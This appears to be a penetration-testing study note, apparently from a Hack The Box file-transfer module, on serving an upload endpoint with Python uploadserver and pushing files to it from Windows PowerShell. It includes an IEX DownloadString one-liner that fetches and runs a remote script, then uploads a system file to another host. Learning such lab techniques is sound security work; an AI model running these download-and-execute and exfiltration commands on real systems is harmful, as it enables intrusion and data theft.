---
description: >-
  Python Upload Server
title: Python Upload Server             # Add title here
date: 2024-01-15 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, Python Upload Server]                     # Change Templates to Writeup
tags: [file transfer, python, uploadserver]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Python Web Server to Upload Files

### Installing a Configured WebServer with Upload
For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page.

```bash
Shuciran@htb[/htb]$ pip3 install uploadserver
```

```bash
Shuciran@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### PowerShell Web Uploads
PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

We can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. 

### PowerShell Script to Upload a File to Python Upload Server
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```